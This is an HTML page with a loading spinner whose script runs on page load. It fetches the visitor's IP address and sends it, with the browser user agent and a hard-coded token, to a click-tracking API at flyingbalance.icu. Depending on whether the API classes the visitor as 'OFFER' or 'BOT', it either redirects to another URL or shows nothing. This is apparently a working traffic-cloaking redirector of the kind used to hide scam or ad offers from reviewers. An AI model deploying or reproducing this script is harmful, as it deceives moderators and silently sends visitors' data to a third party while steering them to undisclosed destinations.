<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Request with Preloader</title>
    <link rel="stylesheet" href="preloader.css">
</head>
<body>

    <div class="preloader" id="preloader">
        <div class="preloader-container">
            <span class="animated-preloader"></span>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            makeApiRequest();
        });

        async function getIp() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return 'unknown';
            }
        }

        function getUserAgent() {
            return navigator.userAgent;
        }

        function getQueryParams(params) {
            return Object.keys(params).map(key => `${key}=${encodeURIComponent(params[key])}`).join('&');
        }

        async function makeApiRequest() {
            const ip = await getIp();
            const userAgent = getUserAgent();
            const keyword = "example_keyword";
            const token = "pxtshqzgkd5p7fvkrm4rqtcv2cz7czyq";
            const url = `https://flyingbalance.icu/click_api/v3?token=${token}&log=1&info=1&ip=${ip}&user_agent=${encodeURIComponent(userAgent)}&keyword=${keyword}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.info && data.info.url === 'OFFER') {
                        const params = {
                            token: token,
                            log: 1,
                            info: 1,
                            ip: ip,
                            user_agent: userAgent,
                            keyword: keyword
                        };
                        const newUrl = `https://yourredirecturl.com?${getQueryParams(params)}`;
                        window.location.href = newUrl;
                    } else if (data.info && data.info.url === 'BOT') {
                        console.log("BOT")
                    }
                    hidePreloader();
                })
                .catch(error => {
                    console.error('Error:', error);
                    hidePreloader();
                });
        }

        function hidePreloader() {
            document.getElementById('preloader').style.display = 'none';
        }
    </script>

</body>
</html>
